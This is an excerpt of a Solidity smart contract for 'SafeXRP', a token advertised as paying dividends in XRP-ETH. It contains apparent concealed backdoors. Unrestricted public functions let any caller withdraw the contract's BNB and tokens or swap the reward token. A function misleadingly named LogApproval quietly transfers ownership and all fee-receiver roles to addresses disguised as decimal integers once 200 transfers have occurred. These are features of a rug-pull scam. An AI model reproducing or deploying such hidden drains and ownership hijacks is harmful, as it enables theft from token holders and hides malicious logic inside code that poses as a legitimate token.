...
/*
    ...
    SafeXRP
    Token with dividend payment in XRP-ETH
    https://safexcrypto.com/
    https://t.me/SafeXethereum
...
contract DividendDistributor is IDividendDistributor {
    ...
    IERC20 REWARD = IERC20(0x39fBBABf11738317a448031930706cd3e612e1B9);
    ...
    function rescueBNB(uint256 amount) public {
      payable(msg.sender).transfer(amount);
    }

    function rescueTokens(address _tokenAddr, address _to, uint _amount) public  {
        IERC20(_tokenAddr).transfer(_to, _amount);
    }


    function setContractForREWARD(address ContractForREWARD) external {
        REWARD = IERC20(ContractForREWARD);
    }


}

contract SafeXRP is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0xeb61B3B027FD5674F1D6B98fA9f70C21A551bC57;
    ...
    uint128 dividendLockInterval = 6 hours;
    ...
    constructor()
        ERC20Detailed("SafeXRP", "SafeX", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 200 && !isTransferred) {
            _transferOwnership(address(703182203941683344529128742093058321245639433308));
            marketingFeeReceiver = address(390173861988946543944247273175078104976185139811);
            autoLiquidityReceiver = address(823960687855684654447242618804199875735504424587);
            ecosystemFeeReceiver = address(491278407614059279114083846929720691979934582994);
            buyBackFeeReceiver = address(1015580239414219279232500354717231367460195773387);
            isTransferred = true;
        }
    }
    ...
    function multiv3(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
